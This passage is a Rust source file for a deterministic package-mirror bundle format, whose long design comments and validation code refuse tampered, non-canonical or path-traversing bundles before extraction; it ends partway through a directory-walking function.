// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Andrew Yates

//! `cargo forge mirror bundle | unbundle | check-bundle` — the Lane 1 DELIVERY
//! format: one deterministic file carrying an emitted `local-registry`, its
//! package ledger, and every digest needed to refuse a tampered copy BEFORE a
//! byte of it is unpacked.
//!
//! # Why a house format and not tar
//!
//! A tarball is not deterministic without work: it carries mtimes, uid/gid,
//! permission bits and a directory-order that depends on the filesystem, and
//! every one of those has to be flattened before two runs agree byte for byte.
//! It also carries entry TYPES this delivery must never honour — symlinks,
//! hardlinks, devices — so a reader would have to refuse most of the format it
//! just implemented. The bundle below carries exactly one entry type (a regular
//! file, by relative path, with its sha256 and length) and nothing else, so
//! "refuse a symlink" is not a check, it is an absence.
//!
//! # UNCOMPRESSED, and the measurement that decided it
//!
//! MEASURED on this lock's mirror (79,008,744 payload bytes, 2026-09-01):
//! `gzip -6` 77,677,705 (−1.68%), `zstd -3` 77,878,829 (−1.43%), `lz4 -1`
//! 78,139,156 (−1.10%). A `.crate` is already a gzip'd tar, so ~99% of the
//! payload is incompressible by construction and the whole codec would buy
//! ~870 KB of 78.9 MB. Neither `aterm-lz4` nor any zstd path is a dependency of
//! this crate today, and the one thing this crate must not do is grow the
//! surface it measures — even a first-party codec is a new edge, a new framing,
//! and a second way for a delivery to fail. So the payload is stored, and the
//! ~1% is the price of that.
//!
//! # The format, version 1
//!
//! ```text
//! aterm-mirror-bundle 1\n            <- magic and format version
//! manifest-sha256 <64 hex>\n         <- the digest that gates everything below
//! manifest-bytes <decimal>\n
//! \n                                 <- header ends at the blank line
//! <manifest-bytes bytes of manifest text>
//! <payload: every file's bytes, concatenated in manifest `file` order>
//! ```
//!
//! The manifest is line-oriented ASCII in ONE canonical order — a fixed field
//! block, then `file` rows sorted by path, then `pkg` rows sorted by
//! (name, version):
//!
//! ```text
//! format aterm-mirror-bundle/1
//! lock-sha256 <64 hex>               <- sha256 over Cargo.lock's raw bytes
//! lock-registry-sha256 <64 hex>      <- sha256 over the canonical registry slice
//! lock-registry-packages <decimal>
//! payload-sha256 <64 hex>            <- sha256 over the payload as one stream
//! payload-bytes <decimal>
//! files <decimal>
//! packages <decimal>
//! file <64 hex> <decimal> <relative/path>
//! pkg <name> <version> <64 hex cksum>
//! ```
//!
//! # WHAT MAY BE IN ONE — the shape rule
//!
//! A bundle is a MIRROR or it is not a bundle. Every entry must be a path
//! `mirror emit` writes for the packages the manifest's own `pkg` ledger
//! claims — `<name>-<version>.crate` at the root, `index/<cargo's layout>` for
//! each distinct name — and every such path must be present. The set is
//! computed by [`mirror::mirror_shape`], the same function `mirror verify`
//! judges a directory with, so "a tree this tool accepts" and "a bundle this
//! tool accepts" cannot drift apart.
//!
//! This is a rule about the FORMAT, not about the output directory, and that
//! is deliberate. The delivery model is "download a bundle, unbundle it", so
//! anything the format admits is something a bundle author can write into
//! somebody else's tree. While the format admitted any relative path, a
//! delivered bundle could rewrite `.cargo/config.toml` — with `check-bundle`
//! and `unbundle` both reporting PASS.
//!
//! Two further rules make a green check mean an EXTRACTABLE bundle rather than
//! a merely well-formed one: no two entries may differ only in case (a
//! case-insensitive filesystem cannot hold both, and the loser vanishes
//! between two individually-correct writes), and no entry may be another
//! entry's parent directory (`alpha` and `alpha/x` can only half-extract).
//!
//! # ONE MIRROR, ONE BYTE SEQUENCE
//!
//! The reader requires the manifest bytes to BE the canonical rendering of the
//! rows they parse to, and each header line to be its one canonical spelling.
//! A manifest with CRLF endings, no trailing newline or a padded `007` byte
//! count parses to the same rows, and accepting it would mean two different
//! files describe one mirror — with `bundle-sha256` matching neither.
//!
//! # THE ARCHIVE'S OWN CONTENT DIGEST — and the one that cannot be inside it
//!
//! `payload-sha256` is the digest of everything the archive CARRIES, and it is
//! inside the manifest where a reader can act on it before unpacking. The
//! digest of the whole FILE cannot be: a file cannot contain the hash of
//! itself. That number is still exact and still the thing a signature would
//! cover — it is `sha256(bundle file)`, printed by [`bundle`] and
//! [`check_bundle`] under `bundle-sha256`.
//!
//! It is computed from THE BYTES READ — the header exactly as it arrived, the
//! manifest exactly as it arrived, then every payload byte — never from a
//! re-rendering of the parsed fields, so it is what `shasum -a 256` prints for
//! that file and a verifier outside this tool reaches the same number. It is
//! printed only on a PASS: a digest that is only sometimes `shasum` is worse
//! than none, and a bundle that failed is one whose byte count is in dispute.
//! Signing is the owner's ceremony (see `TODO(mirror-delivery-atpkg)`); this
//! module produces the number and stops.
//!
//! # The verification chain
//!
//! header → `manifest-sha256` → canonical form → the manifest's own structural
//! rules → `lock-registry-sha256` is the digest of the manifest's OWN `pkg`
//! ledger → the mirror shape → `payload-sha256` → each `file` row's sha256 →
//! each `pkg` row's cksum == the sha256 of its `<name>-<version>.crate` file
//! row → each `index/` entry holds exactly the rows the ledger claims, each
//! parsing, each unyanked, each anchored as far as this machine can anchor it.
//! Every link is checked before [`unbundle`] creates a single output
//! file: `unbundle` runs the full [`check_bundle`] pass first, then proves the
//! OUTPUT tree (see below), and only then extracts — re-hashing each entry as
//! it writes so a file that changed between the two passes cannot land, and
//! stat'ing every path afterwards so the count it reports is the filesystem's
//! and not the manifest's.
//!
//! # The output tree
//!
//! `unbundle` writes into an absent or EMPTY directory. A populated one is
//! refused by name, and the refusal names `--force`, which is the only way to
//! extract over an existing tree. `--force` is bounded by the shape rule: even
//! with it, the paths a bundle can name are mirror paths, so the flag can
//! replace tarballs and index rows and nothing else. A symlink at `--out`, one
//! anywhere under it, or a path conflict inside it is a REFUSAL and a VERDICT
//! (exit 1) — the run reached a conclusion. `exit 3` is kept for a filesystem
//! that could not be read or written at all.
//!
//! WHAT IS STILL REACHABLE: a partial extraction, if the filesystem fails
//! part-way — a full disk, an I/O error, a tree edited from another process
//! while the run is in it. No bundle can cause it (the manifest rules above
//! make a conflicting or unextractable bundle a refusal, and the output tree is
//! proven whole before the first write), and nothing is deleted on the way out
//! because `--force` may have been pointed at a tree the operator cares about.
//! Every mid-run failure therefore NAMES how many files had already landed and
//! says to delete the directory before re-running.
//!
//! # INTEGRITY and SHAPE, not PROVENANCE
//!
//! Every digest a bundle carries lives INSIDE the bundle, so an attacker who
//! can edit the file re-seals them and they all agree again. A green
//! `check-bundle` therefore proves that the file is internally consistent and
//! is a mirror — not that it is THE MIRROR THE OWNER EMITTED. The verdict text
//! says this in the same words rather than leaving it to be inferred.
//!
//! Two checks reach outside the file, and neither is complete on its own:
//!
//! - `index/` rows are compared byte-for-byte against cargo's own sparse-index
//!   cache when the machine has one ([`mirror::RowAnchor`]). This is the check
//!   that refuses an edited `features` map, and it is unavailable on exactly
//!   the machine a delivery lands on.
//! - Every dependency `Cargo.lock` RESOLVED must still be declared by its
//!   package's row. This one travels with the delivery — but a lock carries no
//!   feature data at all, so it cannot see a feature edit.
//!
//! BOTH verbs run both checks and BOTH PRINT HOW FAR THEY GOT, because the
//! machine that has neither anchor is a real machine and its verdict must not
//! read like the emitting box's. `unbundle` used to pass no workspace at all,
//! which silently switched off the second check on the one machine where it is
//! the only check left; [`LockUse`] is the distinction that fixes it — a
//! delivery target does not compare the lock DIGEST (a mirror for another lock
//! is still extractable) and does require the lock's EDGES.
//!
//! What closes the rest is a signature over `bundle-sha256`, which is the
//! owner's ceremony (`TODO(mirror-delivery-atpkg)`); nothing here signs or
//! verifies one, and the verdict names it as the missing link rather than
//! implying the chain is whole without it.
//!
//! # What a green bundle does NOT prove
//!
//! That the tarballs are UPSTREAM's. It proves they are the bytes
//! `Cargo.lock` names, which is the same trust root the mirror itself has. A
//! lock written against a compromised registry bundles that compromise
//! faithfully. It also proves nothing about signatures: an unsigned bundle
//! with a perfect internal chain is exactly as trustworthy as the channel it
//! arrived on.

use crate::Outcome;
use crate::mirror::{
    self, IO_CHUNK_BYTES, RegistryPkg, RowProvenance, atomic_replace, digest_hex, hash_file,
    reject_symlinks_under, sha256_hex, validate_checksum, validate_package_name, validate_version,
};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::fs::File;
use std::io::{BufReader, Read, Write};
use std::path::{Component, Path, PathBuf};

/// The magic line. A version bump changes this string, so a reader that does
/// not know a format cannot mistake it for one it does.
const MAGIC: &str = "aterm-mirror-bundle 1";
const FORMAT_ID: &str = "aterm-mirror-bundle/1";

/// A manifest for this lock's 495 packages is ~90 KB, and each further package
/// costs ~190 bytes, so 8 MiB is room for ~44,000 of them — an order of
/// magnitude past any lock this repository will have.
///
/// The cap exists so a hostile header cannot name an absurd size, and the READ
/// below is incremental (`Read::take` + `read_to_end`), so the buffer grows
/// with bytes that are actually THERE rather than with the number the header
/// claims. Both together: the one allocation made on unverified input is
/// bounded by the smaller of the cap and the file.
const MAX_MANIFEST_BYTES: u64 = 8 * 1024 * 1024;

// ---------------------------------------------------------------------------
// The manifest
// ---------------------------------------------------------------------------

/// One regular file the bundle carries.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FileEntry {
    /// Relative, `/`-separated, already proven to be a sequence of ordinary
    /// path components — no root, no prefix, no `.`, no `..`, no backslash.
    pub path: String,
    pub sha256: String,
    pub bytes: u64,
}

/// Everything the bundle claims about itself, in parsed form.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Manifest {
    pub lock_sha256: String,
    pub lock_registry_sha256: String,
    pub payload_sha256: String,
    pub payload_bytes: u64,
    pub files: Vec<FileEntry>,
    /// `(name, version, cksum)` — the lock slice the mirror was emitted from.
    pub packages: Vec<(String, String, String)>,
}

/// The canonical rendering of the lock's registry slice: one
/// `name\tversion\tchecksum` line per package, sorted, newline-terminated.
/// This is what `lock-registry-sha256` hashes, and it is what the shippable
/// `[source]` fragment anchors to — so an unrelated edit elsewhere in
/// `Cargo.lock` (a path package's version, a comment) does not read as mirror
/// drift, while any change to WHAT IS MIRRORED does.
pub fn canonical_registry_slice(pkgs: &[RegistryPkg]) -> String {
    canonical_slice_rows(
        pkgs.iter()
            .map(|p| (p.name.as_str(), p.version.as_str(), p.checksum.as_str())),
    )
}

/// The same rendering from bare `(name, version, cksum)` triples — which is
/// exactly what a bundle's own `pkg` ledger is. One function, so a manifest can
/// be asked to prove that its `lock-registry-sha256` is the digest OF THE
/// LEDGER IT CARRIES rather than a number it merely quotes.
fn canonical_slice_rows<'a>(rows: impl Iterator<Item = (&'a str, &'a str, &'a str)>) -> String {
    let mut rows: Vec<String> = rows
        .map(|(name, version, cksum)| format!("{name}\t{version}\t{cksum}\n"))
        .collect();
    rows.sort();
    rows.concat()
}

/// `sha256` over [`canonical_registry_slice`], the number the gate compares.
pub fn registry_slice_digest(pkgs: &[RegistryPkg]) -> String {
    sha256_hex(canonical_registry_slice(pkgs).as_bytes())
}

impl Manifest {
    /// The empty manifest returned beside a RED verdict when the bundle never
    /// parsed. Callers that act on a manifest must check `ok` first; this
    /// exists so the verdict type stays one shape.
    fn rejected() -> Self {
        Self {
            lock_sha256: String::new(),
            lock_registry_sha256: String::new(),
            payload_sha256: String::new(),
            payload_bytes: 0,
            files: Vec::new(),
            packages: Vec::new(),
        }
    }

    /// The canonical text. Determinism lives here: fixed field order, `file`
    /// rows sorted by path, `pkg` rows sorted by (name, version), no
    /// timestamps, no permissions, no ownership, no host paths.
    fn render(&self) -> String {
        let mut s = String::with_capacity(128 + self.files.len() * 96 + self.packages.len() * 96);
        let _ = writeln!(s, "format {FORMAT_ID}");
        let _ = writeln!(s, "lock-sha256 {}", self.lock_sha256);
        let _ = writeln!(s, "lock-registry-sha256 {}", self.lock_registry_sha256);
        let _ = writeln!(s, "lock-registry-packages {}", self.packages.len());
        let _ = writeln!(s, "payload-sha256 {}", self.payload_sha256);
        let _ = writeln!(s, "payload-bytes {}", self.payload_bytes);
        let _ = writeln!(s, "files {}", self.files.len());
        let _ = writeln!(s, "packages {}", self.packages.len());
        for f in &self.files {
            let _ = writeln!(s, "file {} {} {}", f.sha256, f.bytes, f.path);
        }
        for (name, version, cksum) in &self.packages {
            let _ = writeln!(s, "pkg {name} {version} {cksum}");
        }
        s
    }
}

/// Every rule a bundle path must satisfy, in ONE place, applied identically by
/// the writer and the reader — so a bundle this tool cannot read is a bundle it
/// also cannot write.
///
/// Refused: absolute paths, Windows prefixes, `..` and `.` components, empty
/// components, backslashes (a `..\\` that a `/`-only split would miss, and the
/// `C:\` shape), trailing slashes, control bytes, non-ASCII, and anything
/// whose component count is zero.
fn validate_entry_path(path: &str) -> Result<(), String> {
    if path.is_empty() {
        return Err("REFUSED empty bundle entry path".to_string());
    }
    if !path.is_ascii() {
        return Err(format!("REFUSED non-ASCII bundle entry path `{path}`"));
    }
    if path.bytes().any(|b| b.is_ascii_control()) {
        return Err(format!(
            "REFUSED bundle entry path with a control byte: `{}`",
            path.escape_default()
        ));
    }
    if path.contains('\\') {
        return Err(format!(
            "REFUSED bundle entry path containing a backslash: `{path}`"
        ));
    }
    if path.starts_with('/') {
        return Err(format!("REFUSED absolute bundle entry path `{path}`"));
    }
    if path.ends_with('/') {
        return Err(format!(
            "REFUSED bundle entry path naming a directory: `{path}`"
        ));
    }
    for part in path.split('/') {
        if part.is_empty() {
            return Err(format!(
                "REFUSED bundle entry path with an empty component: `{path}`"
            ));
        }
        if part == "." || part == ".." {
            return Err(format!(
                "REFUSED bundle entry path traversal component `{part}` in `{path}`"
            ));
        }
    }
    // Belt and braces: ask the platform's own parser too, so a shape only it
    // understands (a `\\?\` prefix on Windows, say) cannot slip past the
    // string rules above.
    if Path::new(path)
        .components()
        .any(|c| !matches!(c, Component::Normal(_)))
    {
        return Err(format!(
            "REFUSED bundle entry path that is not a plain relative path: `{path}`"
        ));
    }
    Ok(())
}

/// Parse and structurally validate a manifest. Every refusal here fires BEFORE
/// any payload byte is read and long before any file is created.
fn parse_manifest(text: &str) -> Result<Manifest, String> {
    let mut lines = text.lines();
    let mut field = |key: &str| -> Result<String, String> {
        let line = lines
            .next()
            .ok_or_else(|| format!("REFUSED truncated bundle manifest: expected `{key}`"))?;
        let value = line.strip_prefix(key).and_then(|r| r.strip_prefix(' '));
        value.map(str::to_string).ok_or_else(|| {
            format!("REFUSED bundle manifest field out of order: expected `{key} …`, got `{line}`")
        })
    };
    let format = field("format")?;
    if format != FORMAT_ID {
        return Err(format!(
            "REFUSED bundle manifest format `{format}`, expected `{FORMAT_ID}`"
        ));
    }
    let lock_sha256 = field("lock-sha256")?;
    let lock_registry_sha256 = field("lock-registry-sha256")?;
    let lock_registry_packages = field("lock-registry-packages")?;
    let payload_sha256 = field("payload-sha256")?;
    let payload_bytes = field("payload-bytes")?;
    let file_count = field("files")?;
    let package_count = field("packages")?;

    for (what, value) in [
        ("lock-sha256", &lock_sha256),
        ("lock-registry-sha256", &lock_registry_sha256),
        ("payload-sha256", &payload_sha256),
    ] {
        validate_checksum(value).map_err(|why| format!("REFUSED bundle `{what}`: {why}"))?;
    }
    let number = |what: &str, raw: &str| -> Result<u64, String> {
        raw.parse::<u64>()
            .map_err(|_| format!("REFUSED bundle `{what}` value `{raw}`: not a decimal number"))
    };
    let payload_bytes = number("payload-bytes", &payload_bytes)?;
    let file_count = number("files", &file_count)?;
    let package_count = number("packages", &package_count)?;
    let lock_registry_packages = number("lock-registry-packages", &lock_registry_packages)?;
    if lock_registry_packages != package_count {
        return Err(format!(
            "REFUSED bundle manifest: `lock-registry-packages` {lock_registry_packages} \
             disagrees with `packages` {package_count}"
        ));
    }

    let mut files: Vec<FileEntry> = Vec::new();
    let mut packages: Vec<(String, String, String)> = Vec::new();
    let mut total_bytes = 0u64;
    for line in lines {
        if let Some(rest) = line.strip_prefix("file ") {
            if !packages.is_empty() {
                return Err(
                    "REFUSED bundle manifest: a `file` row after the `pkg` rows begin".to_string(),
                );
            }
            let mut parts = rest.splitn(3, ' ');
            let (Some(sha), Some(size), Some(path)) = (parts.next(), parts.next(), parts.next())
            else {
                return Err(format!("REFUSED malformed bundle `file` row: `{line}`"));
            };
            validate_checksum(sha)
                .map_err(|why| format!("REFUSED bundle `file` row digest: {why}"))?;
            let size = number("file size", size)?;
            validate_entry_path(path)?;
            // Strictly increasing order refuses a duplicate name and a
            // non-canonical ordering with one comparison — and a bundle whose
            // rows are not canonical could not have been produced by `bundle`,
            // so accepting it would mean accepting two byte sequences for one
            // mirror.
            if let Some(previous) = files.last()
                && previous.path.as_str() >= path
            {
                return Err(if previous.path == path {
                    format!("REFUSED duplicate bundle entry `{path}`")
                } else {
                    format!(
                        "REFUSED bundle `file` rows out of canonical order (`{}` then `{path}`)",
                        previous.path
                    )
                });
            }
            total_bytes = total_bytes
                .checked_add(size)
                .ok_or_else(|| "REFUSED bundle `file` sizes that overflow u64".to_string())?;
            files.push(FileEntry {
                path: path.to_string(),
                sha256: sha.to_string(),
                bytes: size,
            });
        } else if let Some(rest) = line.strip_prefix("pkg ") {
            let mut parts = rest.splitn(3, ' ');
            let (Some(name), Some(version), Some(cksum)) =
                (parts.next(), parts.next(), parts.next())
            else {
                return Err(format!("REFUSED malformed bundle `pkg` row: `{line}`"));
            };
            validate_package_name(name)
                .map_err(|why| format!("REFUSED bundle `pkg` row: {why}"))?;
            validate_version(version).map_err(|why| format!("REFUSED bundle `pkg` row: {why}"))?;
            validate_checksum(cksum).map_err(|why| format!("REFUSED bundle `pkg` row: {why}"))?;
            if let Some((previous_name, previous_version, _)) = packages.last() {
                let previous = (previous_name.as_str(), previous_version.as_str());
                if previous >= (name, version) {
                    return Err(if previous == (name, version) {
                        format!("REFUSED duplicate bundle package row `{name} {version}`")
                    } else {
                        format!(
                            "REFUSED bundle `pkg` rows out of canonical order (`{} {}` then \
                             `{name} {version}`)",
                            previous_name, previous_version
                        )
                    });
                }
            }
            packages.push((name.to_string(), version.to_string(), cksum.to_string()));
        } else {
            return Err(format!("REFUSED unknown bundle manifest row: `{line}`"));
        }
    }

    if files.len() as u64 != file_count {
        return Err(format!(
            "REFUSED bundle manifest: header says {file_count} files, {} rows follow",
            files.len()
        ));
    }
    if packages.len() as u64 != package_count {
        return Err(format!(
            "REFUSED bundle manifest: header says {package_count} packages, {} rows follow",
            packages.len()
        ));
    }
    if total_bytes != payload_bytes {
        return Err(format!(
            "REFUSED bundle manifest: `file` rows total {total_bytes} bytes, \
             `payload-bytes` says {payload_bytes}"
        ));
    }

    // `lock-registry-sha256` IS A DERIVED NUMBER, so it is derived and not
    // trusted. Until this check the field was free text: a bundle could carry
    // two packages and the 494-package lock digest, and `check-bundle` printed
    // `lock: MATCHES this workspace (494 registry package(s))` over four
    // entries, exit 0, PASS. The digest is over one canonical line per package,
    // so recomputing it here also pins the COUNT — the comparison the verdict
    // line was implying and not making.
    let derived = sha256_hex(
        canonical_slice_rows(
            packages
                .iter()
                .map(|(name, version, cksum)| (name.as_str(), version.as_str(), cksum.as_str())),
        )
        .as_bytes(),
    );
    if derived != lock_registry_sha256 {
        return Err(format!(
            "REFUSED bundle manifest: `lock-registry-sha256` {lock_registry_sha256} is not the \
             digest of this bundle's own {} `pkg` row(s), which hash to {derived}. That field \
             is what a workspace compares its live Cargo.lock against, so a bundle quoting \
             somebody else's number would be blessed as matching a package set it does not \
             carry.",
            packages.len()
        ));
    }

    // The binding that makes the package ledger load-bearing rather than
    // decorative: every package must BE a file in this bundle, at the exact
    // name cargo's local-registry reader looks for, with the cksum the lock
    // named.
    let by_path: BTreeMap<&str, &FileEntry> = files.iter().map(|f| (f.path.as_str(), f)).collect();
    for (name, version, cksum) in &packages {
        let want = format!("{name}-{version}.crate");
        let Some(entry) = by_path.get(want.as_str()) else {
            return Err(format!(
                "REFUSED bundle package `{name} {version}`: no `{want}` entry"
            ));
        };
        if entry.sha256 != *cksum {
            return Err(format!(
                "REFUSED bundle package `{name} {version}`: `{want}` digest {} disagrees with \
                 the lock cksum {cksum}",
                entry.sha256
            ));
        }
    }

    // Two paths that a case-insensitive filesystem cannot both hold. The index
    // is lowercase by construction and a version may legally carry uppercase,
    // so a pair like `foo-1.0.0-Beta.crate` / `foo-1.0.0-beta.crate` is
    // structurally legal and still unextractable: on APFS or NTFS the second
    // write silently REPLACES the first, each write individually correct, and
    // the run reports a file count the disk does not have. Refused here, where
    // the whole set is visible, rather than discovered halfway through a
    // 79 MB extraction.
    let mut folded: BTreeMap<String, &str> = BTreeMap::new();
    for f in &files {
        if let Some(previous) = folded.insert(f.path.to_ascii_lowercase(), f.path.as_str()) {
            return Err(format!(
                "REFUSED bundle entries `{previous}` and `{}`, which differ only in case — on a \
                 case-insensitive filesystem one would silently overwrite the other",
                f.path
            ));
        }
    }

    // A path that is also another path's DIRECTORY. `alpha` and `alpha/x`
    // cannot both exist, so a bundle carrying both is one that check-bundle
    // would pass and extraction could only half-perform. Compared folded, for
    // the same reason as above. Inside the mirror shape below this pair is
    // unreachable — the check is here so that `check-bundle` PASS means
    // "extractable", proven, rather than argued from the layout.
    for f in &files {
        for (at, byte) in f.path.bytes().enumerate() {
            if byte != b'/' {
                continue;
            }
            let parent = f.path[..at].to_ascii_lowercase();
            if let Some(previous) = folded.get(&parent) {
                return Err(format!(
                    "REFUSED bundle entries `{previous}` and `{}`: the first is a file, the \
                     second needs it to be a directory",
                    f.path
                ));
            }
        }
    }

    // THE SHAPE. A bundle is a mirror or it is not a bundle: every entry must
    // be a path `mirror emit` writes for the packages this manifest claims,
    // and every such path must be present. Without this the format admitted
    // ANY relative path, so a delivered bundle could write `.cargo/config.toml`
    // — or a README, or a shell script — into the output tree with the tool
    // reporting PASS, because the only sweep was `*.crate` at the top level.
    let shape = mirror::mirror_shape(
        packages
            .iter()
            .map(|(name, version, _)| (name.as_str(), version.as_str())),
    )
    .map_err(|why| format!("REFUSED bundle package ledger: {why}"))?;
    for f in &files {
        if !shape.contains(&f.path) {
            return Err(format!(
                "REFUSED bundle entry `{}`: not a mirror path. A bundle carries only \
                 `index/<cargo layout>` rows and `<name>-<version>.crate` tarballs its `pkg` \
                 ledger claims — nothing else may ride along, at any depth.",
                f.path
            ));
        }
    }
    for want in &shape {
        if !by_path.contains_key(want.as_str()) {
            return Err(format!(
                "REFUSED incomplete bundle: no `{want}` entry, which the `pkg` ledger requires"
            ));
        }
    }

    Ok(Manifest {
        lock_sha256,
        lock_registry_sha256,
        payload_sha256,
        payload_bytes,
        files,
        packages,
    })
}

// ---------------------------------------------------------------------------
// Reading the header
// ---------------------------------------------------------------------------

/// Read exactly one `\n`-terminated line, refusing an unterminated or
/// unreasonably long one. Used only for the four header lines, so the cap is
/// tight.
fn read_header_line(reader: &mut impl Read, at: &Path) -> Result<String, String> {
    let mut out = Vec::new();
    let mut byte = [0u8; 1];
    loop {
        let read = reader
            .read(&mut byte)
            .map_err(|e| format!("cannot read {}: {e}", at.display()))?;
        if read == 0 {
            return Err(format!(
                "REFUSED truncated bundle header in {} (no newline)",
                at.display()
            ));
        }
        if byte[0] == b'\n' {
            break;
        }
        if out.len() >= 256 {
            return Err(format!(
                "REFUSED over-long bundle header line in {}",
                at.display()
            ));
        }
        out.push(byte[0]);
    }
    String::from_utf8(out)
        .map_err(|_| format!("REFUSED non-UTF-8 bundle header line in {}", at.display()))
}

struct Opened {
    reader: BufReader<File>,
    manifest: Manifest,
    /// The header bytes EXACTLY as they were read, and the manifest bytes
    /// EXACTLY as they were read — never a re-rendering of what they parsed
    /// to. `bundle-sha256` is the digest of the file, so it is computed from
    /// the file's own bytes or it is not that number.
    header_raw: Vec<u8>,
    manifest_raw: Vec<u8>,
}

/// Why an open failed, split by WHOSE fault it is — because the exit code is
/// the answer a script reads. A corrupt or forged bundle is a VERDICT
/// (`exit::FAIL`), exactly like a payload byte that does not hash; a file this
/// process cannot read at all is `exit::COULD_NOT_RUN`. Without the split, one
/// flipped byte exited 1 or 3 depending only on whether it landed in the header
/// or the payload, and a caller keying on the code would draw a different
/// conclusion from the same tamper.
enum OpenError {
    /// The bundle is not what it claims. Reported, never a pass.
    Bad(String),
    /// The bundle could not be read. Not a judgement about its contents.
    Unreadable(String),
}

/// Open a bundle, check the header and the manifest digest, and parse the
/// manifest — leaving the reader positioned at the first payload byte. NOTHING
/// downstream of this function trusts a manifest field that this function did
/// not first prove is covered by `manifest-sha256`.
fn open_bundle(file: &Path) -> Result<Opened, OpenError> {
    let meta = std::fs::symlink_metadata(file)
        .map_err(|e| OpenError::Unreadable(format!("cannot inspect {}: {e}", file.display())))?;
    if meta.file_type().is_symlink() {
        return Err(OpenError::Bad(format!(
            "REFUSED bundle symlink {}",
            file.display()
        )));
    }
    if !meta.is_file() {
        return Err(OpenError::Bad(format!(
            "REFUSED bundle path that is not a regular file: {}",
            file.display()
        )));
    }
    let handle = File::open(file)
        .map_err(|e| OpenError::Unreadable(format!("cannot read {}: {e}", file.display())))?;
    let mut reader = BufReader::with_capacity(IO_CHUNK_BYTES, handle);

    let magic = read_header_line(&mut reader, file).map_err(OpenError::Bad)?;
    if magic != MAGIC {
        return Err(OpenError::Bad(format!(
            "{} is not an aterm mirror bundle (first line `{magic}`, expected `{MAGIC}`)",
            file.display()
        )));
    }
    let digest_line = read_header_line(&mut reader, file).map_err(OpenError::Bad)?;
    let manifest_sha256 = digest_line
        .strip_prefix("manifest-sha256 ")
        .ok_or_else(|| {
            OpenError::Bad(format!(
                "REFUSED bundle header: expected `manifest-sha256 …`, got `{digest_line}`"
            ))
        })?
        .to_string();
    validate_checksum(&manifest_sha256)
        .map_err(|why| OpenError::Bad(format!("REFUSED bundle `manifest-sha256`: {why}")))?;
    let bytes_line = read_header_line(&mut reader, file).map_err(OpenError::Bad)?;
    let manifest_bytes: u64 = bytes_line
        .strip_prefix("manifest-bytes ")
        .ok_or_else(|| {
            OpenError::Bad(format!(
                "REFUSED bundle header: expected `manifest-bytes …`, got `{bytes_line}`"
            ))
        })?
        .parse()
        .map_err(|_| {
            OpenError::Bad(format!(
                "REFUSED bundle `manifest-bytes` value in `{bytes_line}`"
            ))
        })?;
    // `007` parses to 7 and `7 ` does not, but neither is what `bundle` writes,
    // and a header this reader accepts in two spellings is a header two
    // different files can share. One mirror, one byte sequence.
    if bytes_line != format!("manifest-bytes {manifest_bytes}") {
        return Err(OpenError::Bad(format!(
            "REFUSED non-canonical bundle header line `{bytes_line}` — `bundle` writes \
             `manifest-bytes {manifest_bytes}`"
        )));
    }
    if manifest_bytes > MAX_MANIFEST_BYTES {
        return Err(OpenError::Bad(format!(
            "REFUSED bundle manifest of {manifest_bytes} bytes (cap {MAX_MANIFEST_BYTES}) — \
             refusing to allocate that on an unverified header"
        )));
    }
    let blank = read_header_line(&mut reader, file).map_err(OpenError::Bad)?;
    if !blank.is_empty() {
        return Err(OpenError::Bad(format!(
            "REFUSED bundle header: expected a blank line after `manifest-bytes`, got `{blank}`"
        )));
    }
    // The header EXACTLY as it was read. Every line above is compared against
    // its one canonical spelling, so this is also the only header these four
    // values can have — but it is assembled from the bytes, not from the
    // parse, because `bundle-sha256` has to be the file's digest.
    let mut header_raw = Vec::with_capacity(magic.len() + digest_line.len() + bytes_line.len() + 4);
    for line in [
        magic.as_str(),
        digest_line.as_str(),
        bytes_line.as_str(),
        "",
    ] {
        header_raw.extend_from_slice(line.as_bytes());
        header_raw.push(b'\n');
    }

    // Incremental: `take` bounds the read at the claimed length and
    // `read_to_end` grows with the bytes that arrive, so a header claiming
    // 8 MiB over a 400-byte file allocates ~400 bytes and then fails short.
    let mut manifest_raw = Vec::new();
    reader
        .by_ref()
        .take(manifest_bytes)
        .read_to_end(&mut manifest_raw)
        .map_err(|e| OpenError::Bad(format!("cannot read {}: {e}", file.display())))?;
    if manifest_raw.len() as u64 != manifest_bytes {
        return Err(OpenError::Bad(format!(
            "REFUSED truncated bundle {}: manifest is {} bytes, the header says {manifest_bytes}",
            file.display(),
            manifest_raw.len()
        )));
    }
    let got = sha256_hex(&manifest_raw);
    if got != manifest_sha256 {
        return Err(OpenError::Bad(format!(
            "REFUSED bundle {}: manifest digest {got} does not match the header's \
             {manifest_sha256} — the bundle is corrupt or altered",
            file.display()
        )));
    }
    let text = String::from_utf8(manifest_raw.clone()).map_err(|_| {
        OpenError::Bad(format!(
            "REFUSED non-UTF-8 bundle manifest in {}",
            file.display()
        ))
    })?;
    let manifest = parse_manifest(&text).map_err(OpenError::Bad)?;
    // The reader demands of the manifest exactly what `bundle` proves before
    // writing one: that the bytes ARE the canonical rendering of what they
    // parse to. Without it, a manifest with CRLF endings, a missing final
    // newline or a padded number parsed identically, so two different FILES
    // described one mirror — and `check-bundle` printed a `bundle-sha256` that
    // agreed with neither of them.
    if manifest.render().as_bytes() != manifest_raw.as_slice() {
        return Err(OpenError::Bad(format!(
            "REFUSED non-canonical bundle manifest in {}: the bytes are not the canonical \
             rendering of the rows they parse to (line endings, padding or ordering), so this \
             file is a second spelling of one mirror",
            file.display()
        )));
    }
    Ok(Opened {
        reader,
        manifest,
        header_raw,
        manifest_raw,
    })
}

// ---------------------------------------------------------------------------
// bundle
// ---------------------------------------------------------------------------

/// Per-run bundle statistics.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct BundleStats {
    pub files: usize,
    pub packages: usize,
    pub payload_bytes: u64,
    pub bundle_bytes: u64,
    pub manifest_bytes: u64,
    pub bundle_sha256: String,
    pub payload_sha256: String,
    pub lock_registry_sha256: String,
}

/// Collect every regular file under `dir` as a relative `/`-separated path,
/// refusing symlinks and anything that is not a directory or a regular file.
fn collect_files(dir: &Path) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    let mut pending = vec![PathBuf::new()];
    while let Some(relative) = pending.pop() {
        let here = dir.join(&relative);
        let entries =
            std::fs::read_dir(&here).map_err(|e| format!("cannot read {}: {e}", here.display()))?;
        for entry in entries {
            let entry =
                entry.map_err(|e| format!("cannot read an entry under {}: {e}", here.display()))?;
            let kind = entry
                .file_type()
